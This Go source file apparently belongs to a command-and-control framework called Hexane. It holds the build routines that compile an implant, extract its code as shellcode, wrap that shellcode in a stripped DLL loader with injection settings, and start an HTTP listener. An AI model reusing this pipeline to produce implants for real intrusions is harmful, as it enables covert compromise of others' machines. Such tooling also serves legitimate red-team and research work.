package core

import (
	"fmt"
	"os"
	"path"
	"time"
)

var (
	LinkerLoader = LoaderPath + "/linker.loader.ld"
	HashStrings  = ConfigsPath + "/strings.txt"
	DllMain      = LoaderPath + "/dllmain.cpp"
	RsrcScript   = LoaderPath + "/resource.rc"
	HashHedaer   = CorelibInc + "/names.hpp"
)

func (h *HexaneConfig) GenerateConfig() error {
	var (
		Patch []byte
		Xtea  []byte
		err   error
	)

	h.Key = nil
	h.Key = CryptCreateKey(16)

	if Patch, err = h.PePatchConfig(); err != nil {
		return err
	}

	// Patch = XteaCrypt()
	Xtea = Patch

	h.ConfigBytes = Xtea
	return nil
}

func (h *HexaneConfig) GenerateLoader() error {
	var (
		err       error
		injectCfg *InjectConfig
	)

	RsrcObj := h.Compiler.BuildDirectory + "/resource.res"
	RsrcData := h.Compiler.BuildDirectory + "/shellcode.bin"
	CoreCpp := h.Compiler.BuildDirectory + "/ldrcore.cpp"
	CoreComponents := h.Compiler.BuildDirectory + "/ldrcore.cpp.o"
	Output := h.Compiler.BuildDirectory + "/" + h.ImplantName + h.Compiler.FileExtension

	WrapMessage("DBG", "generating loader config")
	if injectCfg, err = h.GetInjectConfig(); err != nil {
		return err
	}

	WrapMessage("DBG", "generating strings config")
	injectCfg.InjectConfig = h.GetEmbededStrings(injectCfg.Strings)

	if err = h.RunCommand(h.Compiler.Windres + " -O coff " + RsrcScript + " -DRSRCDATA=\"" + RsrcData + "\" -o " + RsrcObj); err != nil {
		return err
	}

	WrapMessage("DBG", "compiling execute object")
	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{CoreCpp, injectCfg.ExecuteObj}, nil, h.Compiler.IncludeDirs, nil, CoreComponents); err != nil {
		return err
	}

	Components := []string{
		DllMain,
		RsrcObj,
		CoreComponents,
	}

	WrapMessage("DBG", "compiling final dll")
	if err = h.CompileObject(h.Compiler.Linker+" -T "+LinkerLoader, Components, []string{"-shared"}, h.Compiler.IncludeDirs, nil, Output); err != nil {
		return err
	}

	WrapMessage("DBG", "embeding strings config into loader dll")
	if err = h.EmbedSectionData(Output, ".text$G", injectCfg.InjectConfig); err != nil {
		return err
	}

	if !h.Compiler.Debug {
		WrapMessage("DBG", "stripping symbols")
		if err = h.RunCommand(h.Compiler.Strip + " " + Output); err != nil {
			return err
		}
	}

	return nil
}

func (h *HexaneConfig) GenerateObjects(srcPath string, dstPath string, linker string, outName string, staticLib bool) error {
	var (
		buildFiles []string
		flags      []string
		files      []os.DirEntry
		err        error
	)

	if err = CreateTemp(dstPath); err != nil {
		return err
	}

	if files, err = FindFiles(srcPath); err != nil {
		return err
	}

	if linker != "" {
		flags = append(h.Compiler.Flags, " -T ", linker)
	} else {
		flags = h.Compiler.Flags
	}

	for _, file := range files {

		Append := false
		srcFile := srcPath + "/" + file.Name()
		objFile := dstPath + "/" + file.Name() + ".o"

		if path.Ext(file.Name()) == ".cpp" {
			if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{srcFile}, flags, []string{RootDirectory}, nil, objFile); err != nil {
				return err
			}

			Append = true
		}

		if path.Ext(file.Name()) == ".asm" {
			if err = h.CompileObject(h.Compiler.Assembler+" -f win64 ", []string{srcFile}, nil, nil, nil, objFile); err != nil {
				return err
			}

			Append = true
		}

		if Append {
			buildFiles = append(buildFiles, objFile)
		}
	}

	outFile := dstPath + "/" + outName

	if staticLib {
		if err = h.CompileObject(h.Compiler.Ar, buildFiles, []string{"rcs"}, nil, nil, outFile); err != nil {
			return err
		}
	} else {
		if err = h.CompileObject(h.Compiler.Mingw+" -c ", buildFiles, flags, []string{RootDirectory}, nil, outFile); err != nil {
			return err
		}
	}

	return nil
}

func (h *HexaneConfig) RunBuild() error {
	var err error

	WrapMessage("INF", "starting build...")
	if err = os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	WrapMessage("INF", "generating config")
	if err = h.GenerateConfig(); err != nil {
		return err
	}

	WrapMessage("INF", "generating hashes")
	if err = GenerateHashes(HashStrings, HashHedaer); err != nil {
		return err
	}

	if !SearchFile(Corelib, "corelib.a") {
		WrapMessage("INF", "generating corelib")

		if err = h.GenerateObjects(Corelib, Corelib, CorelibLd, "/corelib.a", true); err != nil {
			return err
		}
	}

	if h.Implant.Injection != nil {
		WrapMessage("INF", "generating injectlib")

		if err = h.GenerateObjects(Injectlib, h.Compiler.BuildDirectory+"/build", InjectlibLd, "injectlib.a", true); err != nil {
			return err
		}
	}

	if err = h.GenerateObjects(ImplantPath, h.Compiler.BuildDirectory+"/build", ImplantLd, "implant.o", false); err != nil {
		return err
	}

	WrapMessage("INF", "generating shellcode")
	if err = h.CopySectionData(h.Compiler.BuildDirectory+"/interm.exe", h.Compiler.BuildDirectory+"/shellcode.bin", ".text"); err != nil {
		return err
	}

	if h.BuildType == "dll" {
		WrapMessage("INF", "generating dll loader")
		if err = h.GenerateLoader(); err != nil {
			return err
		}
	}

	AddConfig(h)
	go h.HttpServerHandler()

	time.Sleep(time.Millisecond * 500)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}
